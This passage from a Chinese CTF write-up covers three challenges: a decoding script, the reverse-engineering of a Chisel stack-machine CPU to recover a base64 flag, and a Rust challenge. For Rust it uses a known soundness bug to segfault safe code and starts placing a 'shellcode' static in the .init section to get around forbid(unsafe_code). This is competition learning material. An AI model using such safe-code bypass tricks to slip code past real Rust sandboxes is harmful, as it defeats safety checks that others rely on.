    <span class="n">r11d</span> <span class="o">=</span> <span class="n">r8</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">edx</span> <span class="o">=</span> <span class="n">r9</span><span class="p">[</span><span class="n">rsi</span><span class="p">]</span>
    <span class="n">edx</span> <span class="o">=</span> <span class="n">edx</span> <span class="o">^</span> <span class="n">r11d</span>
    <span class="n">rdx</span> <span class="o">=</span> <span class="n">edx</span>
    <span class="n">edx</span> <span class="o">=</span> <span class="n">r10</span><span class="p">[</span><span class="n">rdx</span><span class="p">]</span>
    <span class="n">edx</span> <span class="o">=</span> <span class="n">edx</span> <span class="o">&amp;</span> <span class="mh">0x7f</span>
    <span class="c1"># print(hex(edx), chr(edx))
</span>    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">edx</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
</code></pre></div></div>

<p>输出就是 flag。</p>

<h2 id="次世代立方计算机">次世代立方计算机</h2>

<p>其实根本不需要 jar，直接拿题目源代码就可以，而且更方便，因为可以随便改 Chisel 代码，只要本地配好 Chisel 环境就行，然后 <code class="language-plaintext highlighter-rouge">sbt test</code> 就能看结果。我好歹也是写过 Chisel 的嘛。</p>

<p>首先一个很方便的事情是，我们可以用 <code class="language-plaintext highlighter-rouge">print()</code> 在测试时每个时钟周期输出变量的值，以 Execute.scala 为例，就像这样：</p>

<div class="language-scala highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">val</span> <span class="nv">aluResult</span> <span class="k">=</span> <span class="nc">MuxLookup</span><span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">aluOp</span><span class="o">,</span> <span class="mf">0.</span><span class="n">U</span><span class="o">,</span> <span class="nc">Seq</span><span class="o">(</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_ADD</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">+</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">),</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_SUB</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">-</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">),</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_AND</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">&amp;</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">),</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_OR</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">|</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">),</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_XOR</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">^</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">),</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_SHL</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">&lt;&lt;</span> <span class="n">shiftAmount</span><span class="o">).</span><span class="py">asUInt</span><span class="o">,</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_SHR</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">&gt;&gt;</span> <span class="n">shiftAmount</span><span class="o">).</span><span class="py">asUInt</span><span class="o">,</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_SAR</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span><span class="o">.</span><span class="py">asSInt</span> <span class="o">&gt;&gt;</span> <span class="n">shiftAmount</span><span class="o">).</span><span class="py">asUInt</span><span class="o">,</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_LT</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span><span class="o">.</span><span class="py">asSInt</span> <span class="o">&lt;</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">.</span><span class="py">asSInt</span><span class="o">).</span><span class="py">asUInt</span><span class="o">,</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_LTU</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">&lt;</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">).</span><span class="py">asUInt</span><span class="o">,</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_EQ</span> <span class="o">-&gt;</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">opr1</span> <span class="o">===</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">).</span><span class="py">asUInt</span><span class="o">,</span>
<span class="o">))</span>

<span class="nf">when</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">aluOp</span> <span class="o">===</span> <span class="nv">Instructions</span><span class="o">.</span><span class="py">ALU_XOR</span><span class="o">)</span> <span class="o">{</span>
   <span class="nf">printf</span><span class="o">(</span><span class="s">"ALU XOR: %x ^ %x = %x\n"</span><span class="o">,</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr1</span><span class="o">,</span> <span class="nv">io</span><span class="o">.</span><span class="py">opr2</span><span class="o">,</span> <span class="n">aluResult</span><span class="o">)</span>
<span class="o">}</span>
</code></pre></div></div>

<p>于是每次 ALU 跑出 xor 的时候，都会输出这一段，方便调试。</p>

<p>此外，根据 Instructions.scala，可以写出 disassembler：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"rom.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="c1"># stack0 = stack[sp], stack1 = stack[sp - 1]
</span><span class="n">mapping</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mb">0b0000000</span><span class="p">:</span> <span class="s">"nop"</span><span class="p">,</span>
    <span class="mb">0b0000001</span><span class="p">:</span> <span class="s">"dup"</span><span class="p">,</span>  <span class="c1"># stack[sp+1] = stack[sp]; sp++
</span>    <span class="mb">0b0000010</span><span class="p">:</span> <span class="s">"swap"</span><span class="p">,</span> <span class="c1"># stack0 &lt;-&gt; stack1
</span>    <span class="mb">0b0000011</span><span class="p">:</span> <span class="s">"ld"</span><span class="p">,</span>   <span class="c1"># stack[sp] = mem[stack[sp]]
</span>    <span class="mb">0b0000100</span><span class="p">:</span> <span class="s">"st"</span><span class="p">,</span>
    <span class="mb">0b0000101</span><span class="p">:</span> <span class="s">"out"</span><span class="p">,</span>
    <span class="mb">0b0000110</span><span class="p">:</span> <span class="s">"halt"</span><span class="p">,</span>
    <span class="mb">0b0000111</span><span class="p">:</span> <span class="s">"inc"</span><span class="p">,</span>
    <span class="mb">0b0001000</span><span class="p">:</span> <span class="s">"add"</span><span class="p">,</span>
    <span class="mb">0b0001001</span><span class="p">:</span> <span class="s">"sub"</span><span class="p">,</span>
    <span class="mb">0b0001010</span><span class="p">:</span> <span class="s">"and"</span><span class="p">,</span>
    <span class="mb">0b0001011</span><span class="p">:</span> <span class="s">"or"</span><span class="p">,</span>
    <span class="mb">0b0001100</span><span class="p">:</span> <span class="s">"not"</span><span class="p">,</span>
    <span class="mb">0b0001101</span><span class="p">:</span> <span class="s">"xor"</span><span class="p">,</span>  <span class="c1"># stack0 ^ stack1 -&gt; stack0
</span>    <span class="mb">0b0001110</span><span class="p">:</span> <span class="s">"shl"</span><span class="p">,</span>
    <span class="mb">0b0001111</span><span class="p">:</span> <span class="s">"shr"</span><span class="p">,</span>
    <span class="mb">0b0010000</span><span class="p">:</span> <span class="s">"sar"</span><span class="p">,</span>
    <span class="mb">0b0010001</span><span class="p">:</span> <span class="s">"lt"</span><span class="p">,</span>
    <span class="mb">0b0010010</span><span class="p">:</span> <span class="s">"ltu"</span><span class="p">,</span>
    <span class="mb">0b0010011</span><span class="p">:</span> <span class="s">"eq"</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">bidx</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"0x</span><span class="si">{</span><span class="n">idx</span><span class="p">:</span><span class="mi">03</span><span class="n">x</span><span class="si">}</span><span class="s">"</span>
    <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">mapping</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">bidx</span><span class="p">,</span> <span class="n">mapping</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mb">0b0100</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">bidx</span><span class="p">,</span> <span class="sa">f</span><span class="s">"bt 0b</span><span class="si">{</span><span class="p">(</span><span class="n">i</span><span class="o">&amp;</span><span class="mb">0b111</span><span class="p">):</span><span class="mi">03</span><span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">elif</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mb">0b0101</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">bidx</span><span class="p">,</span> <span class="sa">f</span><span class="s">"bf 0b</span><span class="si">{</span><span class="p">(</span><span class="n">i</span><span class="o">&amp;</span><span class="mb">0b111</span><span class="p">):</span><span class="mi">03</span><span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>     <span class="c1"># trigger transfer if stack[sp] == 0, dir by imm
</span>        <span class="k">elif</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mb">0b0110</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">bidx</span><span class="p">,</span> <span class="sa">f</span><span class="s">"j  0b</span><span class="si">{</span><span class="p">(</span><span class="n">i</span><span class="o">&amp;</span><span class="mb">0b111</span><span class="p">):</span><span class="mi">03</span><span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>     <span class="c1"># jump to pc + imm, and transfer by imm
</span>        <span class="k">elif</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">bidx</span><span class="p">,</span> <span class="sa">f</span><span class="s">"li 0b</span><span class="si">{</span><span class="p">(</span><span class="n">i</span><span class="o">&amp;</span><span class="mb">0b111111</span><span class="p">):</span><span class="mi">06</span><span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>  <span class="c1"># stack[++sp] = imm
</span>        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">bidx</span><span class="p">,</span> <span class="sa">f</span><span class="s">"unrecognized (</span><span class="si">{</span><span class="nb">bin</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
</code></pre></div></div>

<p>这个体系结构中最神秘的 PC 跳转的部分（怎么和上一道 binary 这么像？问了一下 xmcp 似乎是同一个出题人）从 Fetch.scala 看是在 <code class="language-plaintext highlighter-rouge">io.dirEn</code> 使能的时候会更新，它会决定 PC 的哪一部分变化：</p>

<div class="language-scala highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// position</span>
<span class="nf">val</span> <span class="o">(</span><span class="n">x</span><span class="o">,</span> <span class="n">nextX</span><span class="o">)</span> <span class="k">=</span> <span class="nf">pos</span><span class="o">(-</span><span class="mf">1.</span><span class="nf">S</span><span class="o">(</span><span class="nv">posWidth</span><span class="o">.</span><span class="py">W</span><span class="o">).</span><span class="py">asUInt</span><span class="o">,</span> <span class="nv">Direction</span><span class="o">.</span><span class="py">XP</span><span class="o">,</span> <span class="nv">Direction</span><span class="o">.</span><span class="py">XN</span><span class="o">)</span>
<span class="nf">val</span> <span class="o">(</span><span class="n">y</span><span class="o">,</span> <span class="n">nextY</span><span class="o">)</span> <span class="k">=</span> <span class="nf">pos</span><span class="o">(</span><span class="mf">0.</span><span class="nf">U</span><span class="o">(</span><span class="nv">posWidth</span><span class="o">.</span><span class="py">W</span><span class="o">),</span> <span class="nv">Direction</span><span class="o">.</span><span class="py">YP</span><span class="o">,</span> <span class="nv">Direction</span><span class="o">.</span><span class="py">YN</span><span class="o">)</span>
<span class="nf">val</span> <span class="o">(</span><span class="n">z</span><span class="o">,</span> <span class="n">nextZ</span><span class="o">)</span> <span class="k">=</span> <span class="nf">pos</span><span class="o">(</span><span class="mf">0.</span><span class="nf">U</span><span class="o">(</span><span class="nv">posWidth</span><span class="o">.</span><span class="py">W</span><span class="o">),</span> <span class="nv">Direction</span><span class="o">.</span><span class="py">ZP</span><span class="o">,</span> <span class="nv">Direction</span><span class="o">.</span><span class="py">ZN</span><span class="o">)</span>
<span class="k">def</span> <span class="nf">pos</span><span class="o">(</span><span class="n">init</span><span class="k">:</span> <span class="kt">UInt</span><span class="o">,</span> <span class="n">dirPos</span><span class="k">:</span> <span class="kt">UInt</span><span class="o">,</span> <span class="n">dirNeg</span><span class="k">:</span> <span class="kt">UInt</span><span class="o">)</span> <span class="k">=</span> <span class="o">{</span>
   <span class="k">val</span> <span class="nv">p</span> <span class="k">=</span> <span class="nc">RegInit</span><span class="o">(</span><span class="n">init</span><span class="o">)</span>
   <span class="k">val</span> <span class="nv">next</span> <span class="k">=</span>
   <span class="nc">Mux</span><span class="o">(</span><span class="n">nextDir</span> <span class="o">===</span> <span class="n">dirPos</span><span class="o">,</span> <span class="n">p</span> <span class="o">+</span> <span class="mf">1.</span><span class="n">U</span><span class="o">,</span>
   <span class="nc">Mux</span><span class="o">(</span><span class="n">nextDir</span> <span class="o">===</span> <span class="n">dirNeg</span><span class="o">,</span> <span class="n">p</span> <span class="o">-</span> <span class="mf">1.</span><span class="n">U</span><span class="o">,</span> <span class="n">p</span><span class="o">))</span>
   <span class="nf">when</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">en</span><span class="o">)</span> <span class="o">{</span> <span class="n">p</span> <span class="o">:=</span> <span class="n">next</span> <span class="o">}</span>
   <span class="o">(</span><span class="n">p</span><span class="o">,</span> <span class="n">next</span><span class="o">)</span>
<span class="o">}</span>

<span class="c1">// fetch the current instruction from the ROM</span>
<span class="k">val</span> <span class="nv">pc</span> <span class="k">=</span> <span class="nc">Cat</span><span class="o">(</span><span class="n">nextZ</span><span class="o">,</span> <span class="n">nextY</span><span class="o">,</span> <span class="n">nextX</span><span class="o">)</span>
<span class="nv">io</span><span class="o">.</span><span class="py">rom</span><span class="o">.</span><span class="py">en</span> <span class="o">:=</span> <span class="nv">io</span><span class="o">.</span><span class="py">en</span>
<span class="nv">io</span><span class="o">.</span><span class="py">rom</span><span class="o">.</span><span class="py">addr</span> <span class="o">:=</span> <span class="n">pc</span>
</code></pre></div></div>

<p>方向由「跳转类指令」的立即数（就这么喊吧）决定：</p>

<div class="language-scala highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// flag of control transfer</span>
<span class="k">val</span> <span class="nv">transfer</span> <span class="k">=</span> <span class="nc">MuxLookup</span><span class="o">(</span><span class="n">ctOp</span><span class="o">,</span> <span class="nv">false</span><span class="o">.</span><span class="py">B</span><span class="o">,</span> <span class="nc">Seq</span><span class="o">(</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">CT_NOP</span> <span class="o">-&gt;</span> <span class="nv">false</span><span class="o">.</span><span class="py">B</span><span class="o">,</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">CT_T</span> <span class="o">-&gt;</span> <span class="nv">oprVal1</span><span class="o">.</span><span class="py">orR</span><span class="o">,</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">CT_F</span> <span class="o">-&gt;</span> <span class="o">!</span><span class="nv">oprVal1</span><span class="o">.</span><span class="py">orR</span><span class="o">,</span>
   <span class="nv">Instructions</span><span class="o">.</span><span class="py">CT_J</span> <span class="o">-&gt;</span> <span class="nv">true</span><span class="o">.</span><span class="py">B</span><span class="o">,</span>
<span class="o">))</span>
<span class="k">val</span> <span class="nv">dir</span> <span class="k">=</span> <span class="nv">io</span><span class="o">.</span><span class="py">inst</span><span class="o">(</span><span class="n">dirWidth</span> <span class="o">-</span> <span class="mi">1</span><span class="o">,</span> <span class="mi">0</span><span class="o">)</span>
</code></pre></div></div>

<p>于是我一开始的思路是，既然这玩意是个状态机（是显然的），那么就会有和 flag 有关的状态，那就把所有的状态变化（RAM、栈、ALU 结果等等）输出出来就行了，结果发现找不到 flag，再仔细一看：数据位宽怎么只有 6 位。</p>

<p>晚上看到了提示，发现要修改初始状态，那么就估计是内存了。之前在调试的时候就注意到，内存的访问 pattern 似乎有所规律：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat 4.txt | grep 'Read addr' | head -n 30             
Read addr 00 data 00
Read addr 00 data 00
Read addr 00 data 00
Read addr 3e data 00
Read addr 3f data 00
Read addr 01 data 00
Read addr 01 data 00
Read addr 00 data 00
Read addr 3e data 01
Read addr 3f data 00
Read addr 02 data 00
Read addr 02 data 00
Read addr 00 data 00
Read addr 3e data 02
Read addr 3f data 00
Read addr 03 data 00
Read addr 03 data 00
Read addr 00 data 00
Read addr 3e data 03
Read addr 3f data 00
Read addr 00 data 00
Read addr 00 data 00
Read addr 00 data 00
Read addr 3e data 00
Read addr 3f data 00
Read addr 01 data 00
Read addr 01 data 00
Read addr 00 data 00
Read addr 3e data 01
Read addr 3f data 00
</code></pre></div></div>

<p>（<code class="language-plaintext highlighter-rouge">Read addr</code> 是我自己加的调试 print）</p>

<p>看起来 pattern 是 00, 01, 02, 03, 00, 01, …。在纸上推了一下，发现似乎前三个输出分别对应 00, 01, 02 位的内存，然后是读取出来 xor。从调试输出可以知道（如果不知道的话自己加 print 跑就是了），开头四个 xor 分别为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ALU XOR: 00 ^ 3d = 003d
ALU XOR: 00 ^ 1f = 001f
ALU XOR: 00 ^ 14 = 0014
ALU XOR: 00 ^ 0f = 000f
</code></pre></div></div>

<p>而且已知输出为 flag 的 base64（<code class="language-plaintext highlighter-rouge">echo -n 'flag' | base64</code> 为 <code class="language-plaintext highlighter-rouge">ZmxhZw==</code>），因此开头四位为 <code class="language-plaintext highlighter-rouge">0x3d^25=36, 0x1f^38=57, 0x14^49=37, 0xf^33=46</code>。特别的，因为数据只有 6 位，所以 base64 对应的数字得看<a href="https://en.wikipedia.org/wiki/Base64#Base64_table_from_RFC_4648">字母表</a>来算。</p>

<p>怎么设置内存初始值呢？我的做法是往 Ram.scala 里面加了四根飞线，改成了这样：</p>

<div class="language-scala highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="nn">cube64.mem</span>

<span class="k">import</span> <span class="nn">chisel3._</span>

<span class="k">class</span> <span class="nc">RamMasterIO</span><span class="o">(</span><span class="n">addrWidth</span><span class="k">:</span> <span class="kt">Int</span><span class="o">,</span> <span class="n">dataWidth</span><span class="k">:</span> <span class="kt">Int</span><span class="o">)</span> <span class="k">extends</span> <span class="nc">Bundle</span> <span class="o">{</span>
  <span class="k">val</span> <span class="nv">en</span> <span class="k">=</span> <span class="nc">Output</span><span class="o">(</span><span class="nc">Bool</span><span class="o">())</span>
  <span class="k">val</span> <span class="nv">writeEn</span> <span class="k">=</span> <span class="nc">Output</span><span class="o">(</span><span class="nc">Bool</span><span class="o">())</span>
  <span class="k">val</span> <span class="nv">addr</span> <span class="k">=</span> <span class="nc">Output</span><span class="o">(</span><span class="nc">UInt</span><span class="o">(</span><span class="nv">addrWidth</span><span class="o">.</span><span class="py">W</span><span class="o">))</span>
  <span class="k">val</span> <span class="nv">writeData</span> <span class="k">=</span> <span class="nc">Output</span><span class="o">(</span><span class="nc">UInt</span><span class="o">(</span><span class="nv">dataWidth</span><span class="o">.</span><span class="py">W</span><span class="o">))</span>
  <span class="k">val</span> <span class="nv">readData</span> <span class="k">=</span> <span class="nc">Input</span><span class="o">(</span><span class="nc">UInt</span><span class="o">(</span><span class="nv">dataWidth</span><span class="o">.</span><span class="py">W</span><span class="o">))</span>
<span class="o">}</span>

<span class="k">class</span> <span class="nc">Ram</span><span class="o">(</span><span class="n">addrWidth</span><span class="k">:</span> <span class="kt">Int</span><span class="o">,</span> <span class="n">dataWidth</span><span class="k">:</span> <span class="kt">Int</span><span class="o">)</span> <span class="k">extends</span> <span class="nc">Module</span> <span class="o">{</span>
  <span class="k">val</span> <span class="nv">io</span> <span class="k">=</span> <span class="nc">IO</span><span class="o">(</span><span class="nc">Flipped</span><span class="o">(</span><span class="k">new</span> <span class="nc">RamMasterIO</span><span class="o">(</span><span class="n">addrWidth</span><span class="o">,</span> <span class="n">dataWidth</span><span class="o">)))</span>

  <span class="k">val</span> <span class="nv">mem</span> <span class="k">=</span> <span class="nc">Mem</span><span class="o">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">addrWidth</span><span class="o">,</span> <span class="nc">UInt</span><span class="o">(</span><span class="nv">dataWidth</span><span class="o">.</span><span class="py">W</span><span class="o">))</span>

  <span class="k">val</span> <span class="nv">addr0</span> <span class="k">=</span> <span class="nc">RegInit</span><span class="o">(</span><span class="mf">36.</span><span class="n">U</span><span class="o">)</span>
  <span class="k">val</span> <span class="nv">addr1</span> <span class="k">=</span> <span class="nc">RegInit</span><span class="o">(</span><span class="mf">57.</span><span class="n">U</span><span class="o">)</span>
  <span class="k">val</span> <span class="nv">addr2</span> <span class="k">=</span> <span class="nc">RegInit</span><span class="o">(</span><span class="mf">37.</span><span class="n">U</span><span class="o">)</span>
  <span class="k">val</span> <span class="nv">addr3</span> <span class="k">=</span> <span class="nc">RegInit</span><span class="o">(</span><span class="mf">46.</span><span class="n">U</span><span class="o">)</span>

  <span class="nv">io</span><span class="o">.</span><span class="py">readData</span> <span class="o">:=</span> <span class="nc">DontCare</span>
  <span class="nf">when</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">en</span><span class="o">)</span> <span class="o">{</span>
    <span class="nf">when</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">writeEn</span><span class="o">)</span> <span class="o">{</span>
      <span class="nf">when</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span> <span class="o">===</span> <span class="mf">0.</span><span class="n">U</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">addr0</span> <span class="o">:=</span> <span class="nv">io</span><span class="o">.</span><span class="py">writeData</span>
      <span class="o">}.</span><span class="py">elsewhen</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span> <span class="o">===</span> <span class="mf">1.</span><span class="n">U</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">addr1</span> <span class="o">:=</span> <span class="nv">io</span><span class="o">.</span><span class="py">writeData</span>
      <span class="o">}.</span><span class="py">elsewhen</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span> <span class="o">===</span> <span class="mf">2.</span><span class="n">U</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">addr2</span> <span class="o">:=</span> <span class="nv">io</span><span class="o">.</span><span class="py">writeData</span>
      <span class="o">}.</span><span class="py">elsewhen</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span> <span class="o">===</span> <span class="mf">3.</span><span class="n">U</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">addr3</span> <span class="o">:=</span> <span class="nv">io</span><span class="o">.</span><span class="py">writeData</span>
      <span class="o">}.</span><span class="py">otherwise</span> <span class="o">{</span>
        <span class="nf">printf</span><span class="o">(</span><span class="s">"Write addr %x data %x\n"</span><span class="o">,</span> <span class="nv">io</span><span class="o">.</span><span class="py">addr</span><span class="o">,</span> <span class="nv">io</span><span class="o">.</span><span class="py">writeData</span><span class="o">)</span>
        <span class="nv">mem</span><span class="o">.</span><span class="py">write</span><span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span><span class="o">,</span> <span class="nv">io</span><span class="o">.</span><span class="py">writeData</span><span class="o">)</span>
      <span class="o">}</span>
    <span class="o">}</span> <span class="o">.</span><span class="py">otherwise</span> <span class="o">{</span>
      <span class="nf">when</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span> <span class="o">===</span> <span class="mf">0.</span><span class="n">U</span><span class="o">)</span> <span class="o">{</span>
        <span class="nv">io</span><span class="o">.</span><span class="py">readData</span> <span class="o">:=</span> <span class="n">addr0</span>
      <span class="o">}.</span><span class="py">elsewhen</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span> <span class="o">===</span> <span class="mf">1.</span><span class="n">U</span><span class="o">)</span> <span class="o">{</span>
        <span class="nv">io</span><span class="o">.</span><span class="py">readData</span> <span class="o">:=</span> <span class="n">addr1</span>
      <span class="o">}.</span><span class="py">elsewhen</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span> <span class="o">===</span> <span class="mf">2.</span><span class="n">U</span><span class="o">)</span> <span class="o">{</span>
        <span class="nv">io</span><span class="o">.</span><span class="py">readData</span> <span class="o">:=</span> <span class="n">addr2</span>
      <span class="o">}.</span><span class="py">elsewhen</span> <span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span> <span class="o">===</span> <span class="mf">3.</span><span class="n">U</span><span class="o">)</span> <span class="o">{</span>
        <span class="nv">io</span><span class="o">.</span><span class="py">readData</span> <span class="o">:=</span> <span class="n">addr3</span>
      <span class="o">}.</span><span class="py">otherwise</span> <span class="o">{</span>
        <span class="nv">io</span><span class="o">.</span><span class="py">readData</span> <span class="o">:=</span> <span class="nv">mem</span><span class="o">.</span><span class="py">read</span><span class="o">(</span><span class="nv">io</span><span class="o">.</span><span class="py">addr</span><span class="o">)</span>
        <span class="nf">printf</span><span class="o">(</span><span class="s">"Read addr %x data %x\n"</span><span class="o">,</span> <span class="nv">io</span><span class="o">.</span><span class="py">addr</span><span class="o">,</span> <span class="nv">io</span><span class="o">.</span><span class="py">readData</span><span class="o">)</span>
      <span class="o">}</span>      
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>反正我不关心最后综合成什么东西，<code class="language-plaintext highlighter-rouge">sbt test</code> 能跑就行了。</p>

<p>最后跑起来就像这样子：</p>

<p><img src="/pictures/geekgame-2022/sbt.png" alt="Running sbt test"></p>

<p>对着字母表恢复 base64 再解码就行了。</p>

<h2 id="编原译理习题课--实验班">编原译理习题课 · 实验班</h2>

<h3 id="flag-1safe-segfault">Flag 1：Safe segfault</h3>

<p>段错误的话，仍旧故技重施，去 Rust issues 里面翻。有个 I-unsound 的标签很方便。</p>

<p>试了几个 payload，最后用了 <a href="https://github.com/rust-lang/rust/issues/70143#issuecomment-657209328">https://github.com/rust-lang/rust/issues/70143#issuecomment-657209328</a>，利用超大的 align 值让程序挂掉，这个即使是最新的 Rust stable 也还是能用的。</p>

<h3 id="flag-2快-main-一步">Flag 2：快 <code class="language-plaintext highlighter-rouge">main()</code> 一步</h3>

<p>第二个 flag 在第一阶段没有做出来，因为没有想通怎么安全地伪造自定义 fd 的 <code class="language-plaintext highlighter-rouge">File</code> 类型的变量。看了第二阶段第一个提示，<a href="https://github.com/rust-lang/rust/issues/82499">搜了</a><a href="https://github.com/rust-lang/rust/issues/94125">一些</a><a href="https://github.com/rust-lang/rust/issues/28179">链接</a>之后：既然我可以在 Rust 1.51 里面安全地往 ELF section 里面加几乎任何东西，那么我能不能加代码进去？</p>

<p>试了一下，往里面放准确的函数指针还是有点难度，但是可以直接往 <code class="language-plaintext highlighter-rouge">.init</code> 段里面加东西：</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">#![forbid(unsafe_code)]</span>

<span class="nd">#[link_section=</span><span class="s">".init"</span><span class="nd">]</span>
<span class="nd">#[no_mangle]</span>
<span class="k">pub</span> <span class="k">static</span> <span class="n">shellcode</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="k">pub</span> <span class="k">fn</span> <span class="nf">run</span><span class="p">()</span> <span class="p">{</span>
<span class="p">}</span>
</code></pre></div></div>

<p>（最新的 Rust stable 已经不再允许禁止 unsafe 时 link_section 了，所以得开个 Rust 1.51 的容器测试）</p>

<p>然后一跑，Segmentation fault! 挂个 gdb 看看：</p>

